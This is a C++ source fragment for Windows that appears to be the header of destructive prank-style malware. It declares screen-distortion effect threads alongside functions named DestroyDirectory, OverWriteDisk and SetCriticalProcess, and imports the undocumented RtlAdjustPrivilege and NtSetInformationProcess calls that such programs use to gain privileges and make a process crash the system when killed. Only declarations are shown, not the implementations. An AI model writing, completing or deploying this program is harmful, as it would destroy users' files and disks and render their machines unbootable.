#include <Windows.h>
#include <CommCtrl.h>
#include <algorithm>
#include <tchar.h>
#include <winternl.h>
#include "misc.h"
#include "resource.h"

#define WIDTH		640
#define HEIGHT		400
#define SIZE1		WIDTH * HEIGHT
#define SCR_WIDTH	GetSystemMetrics(SM_CXSCREEN)
#define SCR_HEIGHT	GetSystemMetrics(SM_CYSCREEN)
static const BITMAPINFO bmi = { {sizeof(BITMAPINFOHEADER), WIDTH, -HEIGHT, 1, 32, BI_RGB, SIZE1, 0, 0, 0, 0},{0, 0, 0, 0} };
static DWORD pixel[SIZE1];
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
#pragma warning(disable: 6387)
#pragma warning(disable: 6386)
#pragma warning(disable: 6385)
#pragma warning(disable: 6011)
#pragma warning(disable: 28183)
#pragma warning(disable: 6054)
#pragma warning(disable: 6258)


extern DWORD WINAPI TypeInNotepad(LPVOID lpParam);
extern DWORD WINAPI patches(LPVOID lpParam);
extern DWORD WINAPI LOL(LPVOID lpParam);
extern DWORD WINAPI gradient(LPVOID lpParam);
extern DWORD WINAPI tangent(LPVOID lpParam);
extern DWORD WINAPI UGH(LPVOID lpParam);
extern DWORD WINAPI NO(LPVOID lpParam);
extern DWORD WINAPI draw_thread(LPVOID lpParam);
extern DWORD WINAPI Extreme(LPVOID lpParam);
extern DWORD WINAPI ChaoticArt(LPVOID lpParam);
extern DWORD WINAPI MesmerizingCanvas(LPVOID lpParam);
extern DWORD WINAPI Draw2DCube(LPVOID lpParam);
extern DWORD WINAPI MoveIconsRandomly(LPVOID lpParam);
extern DWORD WINAPI DrawSomething(LPVOID lpParam);
extern DWORD WINAPI MandelBrot(LPVOID lpvd);
extern DWORD WINAPI SquareTunnel(LPVOID lpParam);
extern DWORD WINAPI ColourHalf(LPVOID lpParam);
extern DWORD WINAPI InvertScreen(LPVOID lpParam);
extern DWORD WINAPI Light(LPVOID lpParam);
extern DWORD WINAPI ModifyRGBValues(LPVOID lpParam);
extern DWORD WINAPI ColorfulNoise(LPVOID lpParam);
extern DWORD WINAPI RGBColorCycling(LPVOID lpParam);
extern void execute();
extern DWORD WINAPI CheckSKey(LPVOID lpParam);
extern DWORD WINAPI Checkokey(LPVOID lpParam);
extern void DestroyDirectory(LPWSTR Directory);
extern void SetCriticalProcess();
void OverWriteDisk();
